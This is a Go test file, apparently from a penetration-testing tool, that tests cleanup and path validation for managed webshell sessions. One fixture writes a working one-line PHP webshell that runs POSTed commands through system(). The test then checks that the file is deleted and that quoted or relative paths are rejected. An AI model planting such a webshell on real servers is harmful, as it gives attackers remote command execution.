package server

import (
	"context"
	"os"
	"strings"
	"testing"

	"github.com/Autumn-27/artex/session"
)

func TestWebshellCleanupPhysicallyDeletesArtifact(t *testing.T) {
	shell := fakeWebshell(t)
	defer shell.Close()
	store := newFakeSessionStore()
	ledger := &fakeLedger{}
	hub := newSessionHub(store, ledger, nil)
	hub.dial = func(_ context.Context, rawURL, _, _, _ string) (session.Session, error) {
		return session.NewHTTPShell(rawURL, "cmd", "phpcmd")
	}
	dir := t.TempDir()
	path := dir + "/uploaded.php"
	if err := os.WriteFile(path, []byte("<?php system($_POST['cmd']); ?>"), 0o644); err != nil {
		t.Fatalf("seed artifact: %v", err)
	}
	ctx := context.Background()
	reg, err := hub.registerCore(ctx, shell.URL, "cmd", "phpcmd", "", 0, path)
	if err != nil {
		t.Fatalf("register: %v", err)
	}
	sid, _ := reg["session_id"].(int64)
	if sid <= 0 {
		t.Fatalf("session_id=%v", reg["session_id"])
	}
	res, err := hub.cleanupShell(ctx, sid)
	if err != nil {
		t.Fatalf("cleanup: %v", err)
	}
	if res["physical"] != true || res["verified"] != true {
		t.Fatalf("cleanup result=%v", res)
	}
	if _, statErr := os.Stat(path); !os.IsNotExist(statErr) {
		t.Fatalf("artifact still exists: %v", statErr)
	}
	if _, getErr := store.Get(ctx, sid); getErr == nil {
		t.Fatal("session record should be deleted")
	}
	found := false
	for _, op := range ledger.ops {
		if op.Artifact && op.OK && strings.Contains(op.Cleanup, "物理删除") {
			found = true
		}
	}
	if !found {
		t.Fatalf("ledger ops missing physical cleanup: %+v", ledger.ops)
	}
}

func TestWebshellRegisterRejectsRelativeArtifactPath(t *testing.T) {
	hub := newSessionHub(newFakeSessionStore(), &fakeLedger{}, nil)
	hub.dial = func(_ context.Context, rawURL, _, _, _ string) (session.Session, error) {
		return session.NewHTTPShell(rawURL, "cmd", "phpcmd")
	}
	ctx := context.Background()
	if _, err := hub.registerCore(ctx, "http://127.0.0.1:1/x.php", "cmd", "phpcmd", "", 0, "relative/path.php"); err == nil {
		t.Fatal("relative artifact path must be rejected")
	}
	if _, err := hub.registerCore(ctx, "http://127.0.0.1:1/x.php", "cmd", "phpcmd", "", 0, "/tmp/a'b.php"); err == nil {
		t.Fatal("quote in artifact path must be rejected")
	}
}
